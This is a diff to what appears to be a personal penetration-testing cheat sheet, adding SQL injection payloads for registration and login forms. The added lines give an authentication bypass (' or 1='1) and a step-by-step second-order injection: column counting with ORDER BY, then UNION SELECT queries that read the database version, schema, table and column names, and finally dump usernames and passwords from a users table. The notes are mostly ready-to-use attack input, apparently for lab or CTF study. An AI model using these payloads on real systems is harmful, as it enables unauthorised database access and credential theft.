@@ -31,11 +31,27 @@ Connect to MySQL
     # show tables;
         # select * from <DatabaseName>;
         
+       
 SQL injection sign up registration - register.php
     Username: ' or 1='1
     Password: ' or 1='1
     Confirm password: ' or 1='1
-    
+
+Second Order SQL Injection Login watch for sql errors on page
+    Username: admin ‘) order by 3#
+    Password: pass
+If less than 2 columns
+    Username: admin ‘) order by 2#
+    Password: pass
+Can downgrade to single coumn.
+    Username: admin') union select 1,@@version#
+    Username: admin') union select 1,database()#    
+    Username: admin') union select 1,group_concat(distinct table_schema) from information_schema.tables#
+    Username: admin') union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema="sysadmin"
+    Username: admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users"#
+    Username: admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#
+        May expose username and passwords
+        
 -------------------- Enumerating the Database --------------------
 Enumerating the Database
     http://$ip/comment.php?id=738’
